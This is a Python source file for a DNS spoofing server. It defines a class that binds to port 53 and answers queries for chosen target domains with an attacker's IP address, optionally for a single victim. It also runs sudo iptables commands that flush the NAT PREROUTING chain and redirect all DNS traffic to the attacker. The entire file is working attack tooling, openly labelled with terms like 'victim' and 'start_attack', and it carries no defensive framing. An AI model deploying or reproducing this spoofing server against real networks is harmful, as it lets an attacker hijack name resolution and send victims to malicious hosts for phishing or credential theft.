"""
DNS Server for Spoofing
Listens on port 53 and responds with fake IPs for target domains.

This actually RUNS a DNS server (not just sniffing) so when iptables 
redirects DNS queries to us, we respond immediately with our spoofed IP.
"""

import sys
import threading
import socket
import time
from pathlib import Path
from typing import Optional, List
import subprocess
from struct import pack, unpack

sys.path.append(str(Path(__file__).parent.parent))

from utils.logger import get_logger


class DNSServer:
    """Simple DNS server for spoofing attacks"""
    
    def __init__(
        self,
        attacker_ip: str,
        target_domains: Optional[List[str]] = None,
        listen_port: int = 53,
        victim_ip: Optional[str] = None
    ):
        """
        Initialize DNS Server
        
        Args:
            attacker_ip: IP to respond with for target domains
            target_domains: Domains to spoof
            listen_port: Port to listen on (default 53)
            victim_ip: If set, only respond to queries from this IP
        """
        self.attacker_ip = attacker_ip
        self.target_domains = set(d.lower().rstrip('.') for d in (target_domains or ["google.com"]))
        self.listen_port = listen_port
        self.victim_ip = victim_ip
        
        self.logger = get_logger("DNSServer")
        self.is_running = False
        self.server_thread: Optional[threading.Thread] = None
        self.server_socket: Optional[socket.socket] = None
        self.packets_spoofed = 0
        self.start_time = None
        self.iptables_rules_added = False
        
        target_str = f"victim={victim_ip}" if victim_ip else "network-wide"
        self.logger.info(
            f"DNS Server initialized: listen on :{listen_port}, "
            f"spoof to {attacker_ip}, domains={self.target_domains}, {target_str}"
        )
    
    def _is_target_domain(self, domain: str) -> bool:
        """Check if domain should be spoofed"""
        domain = domain.lower().rstrip('.')
        for target in self.target_domains:
            if domain == target or domain.endswith(f'.{target}'):
                return True
        return False
    
    def _parse_dns_query(self, data: bytes) -> tuple:
        """Parse DNS query to extract domain name"""
        try:
            # Skip header (12 bytes)
            offset = 12
            domain_parts = []
            
            while offset < len(data):
                length = data[offset]
                if length == 0:
                    break
                offset += 1
                domain_parts.append(data[offset:offset+length].decode('utf-8'))
                offset += length
            
            domain = '.'.join(domain_parts)
            return domain, True
        except:
            return "", False
    
    def _create_dns_response(self, query_data: bytes, domain: str) -> bytes:
        """Create a DNS response packet"""
        try:
            # Parse query header
            query_id = query_data[0:2]
            
            # Build response header (with response flag QR=1)
            response_id = query_id
            response_flags = b'\x84\x00'  # Standard response
            qdcount = b'\x00\x01'  # 1 question
            ancount = b'\x00\x01'  # 1 answer
            nscount = b'\x00\x00'  # 0 nameservers
            arcount = b'\x00\x00'  # 0 additional
            
            # DNS header
            response = response_id + response_flags + qdcount + ancount + nscount + arcount
            
            # Copy question section from query
            response += query_data[12:12+len(query_data)-12]
            
            # Build answer section
            # Domain name (pointer to question)
            response += b'\xc0\x0c'  # Pointer to offset 12
            
            # Type A (IPv4)
            response += b'\x00\x01'
            
            # Class IN
            response += b'\x00\x01'
            
            # TTL (0 for immediate expiration)
            response += b'\x00\x00\x00\x00'
            
            # Data length (4 bytes for IPv4)
            response += b'\x00\x04'
            
            # IP address
            ip_parts = self.attacker_ip.split('.')
            response += bytes([int(p) for p in ip_parts])
            
            return response
        except Exception as e:
            self.logger.error(f"Error creating DNS response: {e}")
            return b''
    
    def _setup_iptables(self):
        """Setup iptables to redirect DNS to us"""
        try:
            # Flush old rules first
            subprocess.run(
                ["sudo", "iptables", "-t", "nat", "-F", "PREROUTING"],
                capture_output=True, timeout=5
            )
            
            # Add redirection rule
            cmd = [
                "sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
                "-p", "udp", "--dport", "53",
                "-j", "DNAT",
                "--to-destination", f"{self.attacker_ip}:53"
            ]
            
            if self.victim_ip:
                # Only from specific victim
                cmd.insert(6, "-s")
                cmd.insert(7, self.victim_ip)
            
            result = subprocess.run(cmd, capture_output=True, timeout=5, text=True)
            
            if result.returncode == 0:
                self.logger.info(f"✅ iptables: DNS queries → {self.attacker_ip}:53")
                self.iptables_rules_added = True
                return True
            else:
                self.logger.error(f"❌ iptables failed: {result.stderr}")
                return False
        except Exception as e:
            self.logger.error(f"❌ iptables error: {e}")
            return False
    
    def _cleanup_iptables(self):
        """Remove iptables rules"""
        if not self.iptables_rules_added:
            return
        
        try:
            subprocess.run(
                ["sudo", "iptables", "-t", "nat", "-F", "PREROUTING"],
                capture_output=True, timeout=5
            )
            self.logger.info("✅ iptables rules cleaned up")
            self.iptables_rules_added = False
        except Exception as e:
            self.logger.error(f"Error cleaning iptables: {e}")
    
    def _server_loop(self):
        """Main DNS server loop"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Try to bind to 0.0.0.0:53 (all interfaces)
            try:
                self.server_socket.bind(('0.0.0.0', self.listen_port))
                self.logger.info(f"🚀 DNS server listening on 0.0.0.0:{self.listen_port}")
            except OSError as e:
                self.logger.error(f"❌ Cannot bind to port {self.listen_port}: {e}")
                self.logger.error("Port 53 might be in use. Checking with: sudo lsof -i :53")
                self.logger.error("To fix: sudo systemctl stop systemd-resolved")
                self.is_running = False
                return
            except PermissionError:
                self.logger.error(f"❌ Permission denied - cannot bind to port {self.listen_port}")
                self.logger.error("Run with: sudo python3 app.py")
                self.is_running = False
                return
            
            self.server_socket.settimeout(1.0)
            self.logger.info("✅ DNS server socket ready and waiting for queries...")
            
            while self.is_running:
                try:
                    # Receive DNS query
                    data, addr = self.server_socket.recvfrom(512)
                    self.logger.debug(f"📨 Received {len(data)} bytes from {addr}")
                    
                    # Check victim IP if specified
                    if self.victim_ip and addr[0] != self.victim_ip:
                        self.logger.debug(f"❌ Ignoring query from {addr[0]} (not victim {self.victim_ip})")
                        continue
                    
                    # Parse domain
                    domain, success = self._parse_dns_query(data)
                    
                    if not success:
                        self.logger.debug(f"Failed to parse DNS query from {addr[0]}")
                        continue
                    
                    self.logger.debug(f"🔍 Parsed domain: {domain}")
                    
                    if self._is_target_domain(domain):
                        # Create response
                        response = self._create_dns_response(data, domain)
                        
                        if response:
                            # Send response back to client
                            self.server_socket.sendto(response, addr)
                            self.packets_spoofed += 1
                            
                            self.logger.info(
                                f"✅ SPOOFED: {addr[0]} asked for {domain} → "
                                f"replied with {self.attacker_ip}"
                            )
                        else:
                            self.logger.error(f"Failed to create response for {domain}")
                    else:
                        self.logger.debug(f"Domain {domain} not in targets {self.target_domains}")
                
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.is_running:
                        self.logger.error(f"Server error: {e}")
        
        except Exception as e:
            self.logger.error(f"❌ Server fatal error: {e}")
        finally:
            if self.server_socket:
                try:
                    self.server_socket.close()
                except:
                    pass
            self.logger.info("DNS server stopped")
    
    def start_attack(self):
        """Start DNS spoofing server"""
        if self.is_running:
            self.logger.warning("Server already running")
            return False
        
        self.is_running = True
        self.packets_spoofed = 0
        self.start_time = time.time()
        
        # Setup iptables redirection
        if not self._setup_iptables():
            self.logger.warning("⚠️ iptables setup failed, but server will still respond to direct queries")
        
        # Start server thread
        self.server_thread = threading.Thread(
            target=self._server_loop,
            daemon=True,
            name="DNSServer"
        )
        self.server_thread.start()
        
        self.logger.info(f"🚀 DNS Spoofing server started on port {self.listen_port}")
        return True
    
    def stop_attack(self):
        """Stop DNS server"""
        if not self.is_running:
            return False
        
        self.is_running = False
        
        # Wait for thread
        if self.server_thread and self.server_thread.is_alive():
            self.server_thread.join(timeout=2)
        
        # Cleanup iptables
        self._cleanup_iptables()
        
        duration = time.time() - self.start_time if self.start_time else 0
        self.logger.info(
            f"🛑 DNS server stopped | "
            f"Duration: {duration:.1f}s | "
            f"Spoofs sent: {self.packets_spoofed}"
        )
        
        return True
    
    def get_status(self) -> dict:
        """Get server status"""
        return {
            "is_running": self.is_running,
            "attacker_ip": self.attacker_ip,
            "target_domains": list(self.target_domains),
            "packets_spoofed": self.packets_spoofed,
            "start_time": self.start_time,
        }
